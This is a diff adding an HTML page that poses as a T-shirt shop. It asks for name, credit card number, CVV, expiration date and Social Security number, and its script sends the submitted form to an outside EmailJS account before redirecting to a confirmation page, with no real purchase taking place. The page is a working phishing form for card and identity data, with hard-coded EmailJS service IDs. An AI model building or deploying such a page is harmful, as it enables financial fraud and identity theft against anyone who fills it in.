@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BUY Brayden Doing Brayden Things</title>
+</head>
+<body>
+
+<h1>BUY "BRAYDEN DOING BRAYDEN THINGS" T-SHIRT!</h1>
+<h1>$30,000 (FREE SHIPPING!)</h1>
+<img src="braydenthings.png" width="500px">
+<form id="order-form" autocomplete="off"> 
+    <br>
+    QUANTITY: <input required name="quantity" id="quantity" type="number" style="width:30px;" value="1"><br>
+    NAME: <input required name="name" id="name" type="text" placeholder="Brayden"><br>
+    CREDIT CARD: <input required name="credit-card" id="credit-card" pattern="[0-9\s]{16,16}" minlength="16" maxlength="16" type="text" placeholder="xxxxxxxxxxxxxxxx" inputmode="numeric"><br>
+    EXPIRATION: <input required name="expiration" id="expiration" type="month"><br>
+    CVV: <input required name="cvv" id="cvv" type="text" inputmode="numeric" minlength="3" maxlength="3" placeholder="xxx"><br>
+    SOCIAL SECURITY: <input required name="social" id="social" type="text" inputmode="numeric" minlength="9" maxlength="9" placeholder="xxxxxxxxx"><br><br>
+    <input id="order-button" type="submit" value="ORDER NOW!">
+</form>
+
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+    (function(){
+       emailjs.init("service_m56e36t"); 
+    })();
+
+    document.getElementById('order-form').addEventListener('submit', function(event) {
+        event.preventDefault(); 
+        emailjs.sendForm('service_m56e36t', 'template_ovq1ofj', this, '3Ml2hCmi9nOcTw1QW')
+        window.location.href = 'ok.html'; 
+    });
+ </script>
+
+</body>
+</html>
